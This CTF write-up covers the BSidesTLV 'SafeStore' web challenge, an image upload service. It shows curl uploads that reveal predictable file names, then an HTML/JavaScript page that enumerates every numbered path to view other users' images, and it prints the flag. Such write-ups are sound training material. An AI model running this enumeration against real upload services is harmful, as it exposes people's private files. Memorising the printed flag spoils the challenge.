# SafeStore

 * Category: Web
 * 150 Points
 * Solved by the JCTF Team

## Description

> After chasing an adversary, he decided to put the flag inside this safestore app designed by fellow hackers. Can you find the hidden flag?

## Solution

The attached website is an image upload service:

> SafeStore - Free Image Upload Online
> 
> Upload your image to our service and get a link to share with rest of the world!
> Free of charge. Images kept on our servers for 7 days.

Let's try to upload a few images:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/SafeStore]
└─$ curl -X POST https://bstlv24-safe-store.chals.io/upload -F "upload=@out-001.gif"
{"message":"File uploaded!","link":"uploads/app_pub_9126.gif"}

┌──(user@kali)-[/media/sf_CTFs/bsides/SafeStore]
└─$ curl -X POST https://bstlv24-safe-store.chals.io/upload -F "upload=@out-001.gif"
{"message":"File uploaded!","link":"uploads/app_pub_9826.gif"}

┌──(user@kali)-[/media/sf_CTFs/bsides/SafeStore]
└─$ curl -X POST https://bstlv24-safe-store.chals.io/upload -F "upload=@out-001.gif"
{"message":"File uploaded!","link":"uploads/app_pub_1050.gif"}
```

In the response, we receive the path to the uploaded image. We can see that the path is
relatively predictable, with the difference between paths only being the 4-digit number appended
to the file name.

It should be very easy to just enumerate all server files using a similar template and
trying to view other users images. We can do this with a simple HTML file:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Leaker</title>
</head>
<body>
    <script>
        function loadImages() {
            for (let i = 1000; i <= 9999; i++) {
                const img = document.createElement('img');
                img.src = `https://bstlv24-safe-store.chals.io/uploads/app_pub_${i}.gif`;
                img.onerror = () => {
                    img.style.display = 'none';
                };
                document.body.appendChild(img);
            }
        }
        window.onload = loadImages;
    </script>
</body>
</html>
```

Browsing through the images (luckily, before evil users might have uploaded false flags), we
find the flag hidden under `app_pub_8745.gif`: `BeSidesTLV{Guess4bleNam3sIsCla22ic}`.